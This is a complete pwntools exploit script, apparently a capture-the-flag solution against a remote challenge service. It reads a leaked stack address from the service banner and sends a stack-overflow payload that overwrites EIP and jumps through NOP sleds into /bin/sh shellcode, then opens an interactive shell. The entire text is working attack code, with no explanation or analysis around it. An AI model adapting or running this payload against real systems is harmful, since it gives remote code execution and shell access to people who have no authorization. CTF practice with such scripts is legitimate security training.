from pwn import *
r = remote("challenges.hackover.h4q.it", 11337)
s = r.recvuntil('>')

addr = s[133:133+10]
print('Address: ', addr)
trigger = b'crashme\x00'
nops = b'\x90' * 18
eip = p32(int(addr, 16))
shell = asm(shellcraft.sh())

payload = trigger + nops + eip + nops*2 + shell + nops*2
print(payload)
r.sendline(payload)
r.interactive()
